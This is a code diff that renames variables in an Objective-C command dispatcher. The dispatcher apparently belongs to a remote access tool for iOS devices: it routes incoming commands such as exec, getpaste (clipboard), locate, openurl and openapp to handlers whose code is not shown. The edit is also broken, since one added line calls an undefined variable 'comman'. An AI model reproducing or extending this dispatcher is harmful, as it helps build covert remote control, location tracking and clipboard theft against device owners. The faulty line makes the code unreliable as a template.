@@ -31,37 +31,37 @@ void handle_command(int channel, char *cmd, char *args)
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
 
-    NSString *cmd = [NSString stringWithFormat:@"%s", cmd];
-    NSString *args = [NSString stringWithFormat:@"%s", args];
+    NSString *command = [NSString stringWithFormat:@"%s", cmd];
+    NSString *argv = [NSString stringWithFormat:@"%s", args];
 
-    if ([cmd isEqualToString:@"sysinfo"])
+    if ([command isEqualToString:@"sysinfo"])
         [commands cmd_sysinfo];
-    else if ([cmd isEqualToString:@"getpid"])
+    else if ([command isEqualToString:@"getpid"])
         [commands cmd_getpid];
-    else if ([cmd isEqualToString:@"getpaste"])
+    else if ([comman isEqualToString:@"getpaste"])
         [commands cmd_getpaste];
-    else if ([cmd isEqualToString:@"battery"])
+    else if ([command isEqualToString:@"battery"])
         [commands cmd_battery];
-    else if ([cmd isEqualToString:@"getvol"])
+    else if ([command isEqualToString:@"getvol"])
         [commands cmd_getvol];
-    else if ([cmd isEqualToString:@"locate"])
+    else if ([command isEqualToString:@"locate"])
         [commands cmd_locate];
-    else if ([cmd isEqualToString:@"vibrate"])
+    else if ([command isEqualToString:@"vibrate"])
         [commands cmd_vibrate];
-    else if ([cmd isEqualToString:@"bundleids"])
+    else if ([command isEqualToString:@"bundleids"])
         [commands cmd_bundleids];
-    else if ([cmd isEqualToString:@"exec"])
-        [commands cmd_exec:args];
-    else if ([cmd isEqualToString:@"say"])
-        [commands cmd_say:args];
-    else if ([cmd isEqualToString:@"setvol"])
-        [commands cmd_setvol:args];
-    else if ([cmd isEqualToString:@"player"])
-        [commands cmd_player:args];
-    else if ([cmd isEqualToString:@"openapp"])
-        [commands cmd_openapp:args];
-    else if ([cmd isEqualToString:@"openurl"])
-        [commands cmd_openurl:args];
-    else if ([cmd isEqualToString:@"chdir"])
-        [commands cmd_chdir:args];
+    else if ([command isEqualToString:@"exec"])
+        [commands cmd_exec:argv];
+    else if ([command isEqualToString:@"say"])
+        [commands cmd_say:argv];
+    else if ([command isEqualToString:@"setvol"])
+        [commands cmd_setvol:argv];
+    else if ([command isEqualToString:@"player"])
+        [commands cmd_player:argv];
+    else if ([command isEqualToString:@"openapp"])
+        [commands cmd_openapp:argv];
+    else if ([command isEqualToString:@"openurl"])
+        [commands cmd_openurl:argv];
+    else if ([command isEqualToString:@"chdir"])
+        [commands cmd_chdir:argv];
 }
